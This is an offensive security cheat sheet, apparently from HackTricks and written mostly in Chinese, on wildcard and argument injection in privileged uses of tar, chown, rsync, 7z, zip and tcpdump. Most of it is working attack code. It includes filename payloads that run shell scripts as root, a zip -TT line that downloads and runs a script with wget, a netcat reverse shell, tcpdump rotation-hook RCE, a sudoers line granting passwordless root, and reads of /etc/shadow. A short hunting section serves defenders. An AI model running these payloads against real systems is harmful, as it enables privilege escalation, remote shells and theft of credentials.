# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（又称 *glob*）**argument injection** 发生在特权脚本使用 `tar`、`chown`、`rsync`、`zip`、`7z` 等 Unix binary，并搭配未加引号的 wildcard（如 `*`）时。
> 由于 shell 会在执行 binary **之前**展开 wildcard，能够在工作目录中创建文件的 attacker 可以构造以 `-` 开头的文件名，使其被解释为 **options 而非数据**，从而有效注入任意 flags，甚至 commands。
> 本页面汇总了 2023-2025 年最实用的 primitives、近期 research 以及现代 detections。

## chown / chmod

通过滥用 `--reference` flag，可以**复制任意文件的 owner/group 或 permission bits**：
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
当 root 随后执行类似以下命令时：
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` 被注入，导致*所有匹配的文件*继承 `/root/secret``file` 的所有权/权限。

*PoC & tool*：[`wildpwn`](https://github.com/localh0t/wildpwn)（combined attack）。  
另请参阅经典的 DefenseCode 论文，了解详细信息。<sup>[[6]](#references)</sup>

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

通过滥用 **checkpoint** 功能执行任意命令：
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
一旦 root 运行例如 `tar -czf /root/backup.tgz *`，`shell.sh` 就会以 root 身份执行。

### bsdtar / macOS 14+

近期 macOS 上的默认 `tar`（基于 `libarchive`）*不*实现 `--checkpoint`，但你仍然可以通过 **--use-compress-program** flag 实现 code-execution，该 flag 允许你指定外部 compressor。
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
当特权脚本运行 `tar -cf backup.tar *` 时，将启动 `/bin/sh`。

---

## rsync

`rsync` 允许你通过以 `-e` 或 `--rsync-path` 开头的命令行标志覆盖远程 shell，甚至远程 binary：
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
如果 root 稍后使用 `rsync -az * backup:/srv/` archive 该目录，注入的 flag 会在远程端启动你的 shell。

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` mode）。

---

## 7-Zip / 7z / 7za

即使特权脚本*防御性地*在 wildcard 前加上 `--`（以阻止 option parsing），7-Zip format 仍支持 **file list files**，方法是在文件名前加上 `@`。将其与 symlink 结合即可 *exfiltrate arbitrary files*：
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
如果 root 执行类似以下内容：
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip 会尝试将 `root.txt`（→ `/etc/shadow`）作为文件列表读取，随后退出，**并将内容打印到 stderr**。

即使使用 `-- *`，这种方式仍然有效，因为 7-Zip CLI 明确接受普通文件名和 `@listfiles` 作为位置参数，因此像 `@root.txt` 这样的字面文件名仍会被特殊处理。

---

## zip

当应用程序将用户可控的文件名传递给 `zip` 时（无论是通过 wildcard，还是在未使用 `--` 的情况下枚举名称），存在两个非常实用的 primitives。<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook：`-T` 启用“test archive”，而 `-TT <cmd>` 会将 tester 替换为任意程序（长格式：`--unzip-command <cmd>`）。如果你可以注入以 `-` 开头的文件名，请将 flags 拆分到不同的文件名中，以便 short-options parsing 正常工作：
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
注意事项
- 不要尝试使用单个文件名，例如 `'-T -TT <cmd>'` —— short options 会按字符逐个解析，这样会失败。请像示例中那样使用单独的 tokens。
- 如果 app 会从文件名中移除斜杠，请从 bare host/IP 获取内容（默认路径为 `/index.html`），并使用 `-O` 保存到本地，然后执行。
- 可以使用 `-sc`（显示处理后的 argv）或 `-h2`（更多帮助）调试 parsing，以了解 tokens 是如何被使用的。

示例（zip 3.0 上的本地行为）：
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- 数据 exfil/leak：如果 web layer 会回显 `zip` 的 stdout/stderr（naive wrappers 中很常见），注入的 flags（如 `--help`）或 bad options 导致的失败信息就会出现在 HTTP response 中，从而确认 command-line injection，并帮助调整 payload。

---

## 易受 wildcard injection 影响的其他 binaries（2023-2025 quick list）

以下 commands 曾在现代 CTFs 和真实环境中被滥用。payload 始终是 writable directory 中创建的一个*filename*，该目录之后会使用 wildcard 进行处理：

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | 读取文件内容 |
| `flock` | `-c <cmd>` | 执行 command |
| `git`   | `-c core.sshCommand=<cmd>` | 通过 git over SSH 执行 command |
| `scp`   | `-S <cmd>` | 启动 arbitrary program，而不是 ssh |

这些 primitives 不如 *tar/rsync/zip* classics 常见，但在 hunting 时值得检查。

---

## Hunting vulnerable wrappers and jobs

近期的 case studies 表明，wildcard/argv injection 已不再只是 **cron + tar** 问题。<sup>[[5]](#references)</sup> 同一类 bug 持续出现在：

- 从 attacker-controlled upload directories 中“download everything as zip/tar”的 web features
- 暴露带有 attacker-controlled filename/filter fields 的 **tcpdump** wrapper 的 vendor/appliance debug shells
- 在 writable directories 上调用 `tar`、`rsync`、`7z`、`zip`、`chown` 或 `chmod` 的 backup 或 rotation jobs

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
快速判断：

- `-- *` 对许多 GNU tools 来说是一个很好的修复方式，但**不适用于** `7z`/`7za`，因为 `@listfiles` 会被单独解析。
- 对于 `zip`，应查找会直接枚举用户可控文件名的 wrappers；即使没有 shell glob，短选项拆分（`-T` + `-TT <cmd>`）仍然有效。
- 对于 `tcpdump`，应特别关注允许你控制**输出文件名**、**rotation 设置**或**capture-file replay**参数的 wrappers。

---

## tcpdump rotation hooks (-G/-W/-z)：通过 wrappers 中的 argv injection 实现 RCE

当 restricted shell 或 vendor wrapper 通过拼接用户可控字段来构建 `tcpdump` command line（例如 "file name" 参数），且没有进行严格的 quoting/validation 时，你可以偷偷注入额外的 `tcpdump` flags。`-G`（基于时间的 rotation）、`-W`（限制文件数量）和 `-z <cmd>`（rotation 后执行的 command）组合起来后，可以让以运行 tcpdump 的用户身份执行任意 command（appliance 上通常是 root）。<sup>[[1]](#references)[[4]](#references)</sup>

前提条件：

- 你可以影响传递给 `tcpdump` 的 `argv`（例如通过 `/debug/tcpdump --filter=... --file-name=<HERE>` 这样的 wrapper）。
- wrapper 不会清理 file name 字段中的空格或以 `-` 开头的 tokens。

经典 PoC（从可写路径执行 reverse shell script）：
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` forces an immediate rotate after the first matching packet.
- `-z <cmd>` runs the post-rotate command once per rotation. Many builds execute `<cmd> <savefile>`. If `<cmd>` is a script/interpreter, ensure the argument handling matches your payload.

No-removable-media variants:

- If you have any other primitive to write files (e.g., a separate command wrapper that allows output redirection), drop your script into a known path and trigger `-z /bin/sh /path/script.sh` or `-z /path/script.sh` depending on platform semantics.
- Some vendor wrappers rotate to attacker-controllable locations. If you can influence the rotated path (symlink/directory traversal), you can steer `-z` to execute content you fully control without external media.

---

## sudoers：tcpdump with wildcards/additional args → arbitrary write/read and root

非常常见的 sudoers anti-pattern：<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
问题
- `*` glob 和宽松模式只限制第一个 `-w` 参数。`tcpdump` 接受多个 `-w` 选项；最后一个会生效。
- 该规则没有固定其他选项，因此允许使用 `-Z`、`-r`、`-V` 等。

利用原语
- 使用第二个 `-w` 覆盖目标路径（第一个仅用于满足 sudoers）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 在第一个 `-w` 中使用 Path traversal，以逃出受限目录树：
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-Z root` 强制指定输出文件的所有者（会在任意位置创建 root 所有的文件）：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 通过 `-r` 重放精心构造的 PCAP 来写入任意内容（例如，写入一行 sudoers 配置）：

<details>
<summary>创建包含确切 ASCII payload 的 PCAP，并以 root 身份写入</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 使用 `-V <file>` 任意读取文件/secret leak（将其解释为 savefiles 列表）。错误诊断通常会回显行内容，从而泄露内容：
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## 参考资料

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)

{{#include ../../banners/hacktricks-training.md}}
